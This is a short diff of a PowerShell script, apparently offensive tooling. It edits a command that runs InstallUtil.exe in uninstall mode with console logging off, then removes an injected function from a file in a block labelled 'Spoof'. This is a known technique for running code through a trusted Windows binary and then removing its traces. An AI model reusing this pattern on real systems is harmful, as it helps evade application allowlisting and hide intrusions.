@@ -198,7 +198,7 @@ Add-Content -Path $filepath -Value $removalstuff
 }#End Spoof
 
 else{
-$command2="InstallUtil.exe/logfile=C:\Users\fmc\Desktop\log.txt /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
+$command2="InstallUtil.exe/logfile=C:\Users\$env:username\Desktop\log.txt /LogToConsole=false /U `"C:\Users\$env:username\Desktop\standardfile.exe`" "
 Invoke-Expression -Command $command2
 $removalstuff=Get-Content -Path $filepath | Out-String
 $removalstuff=$removalstuff.Replace("$Functioncommand","")
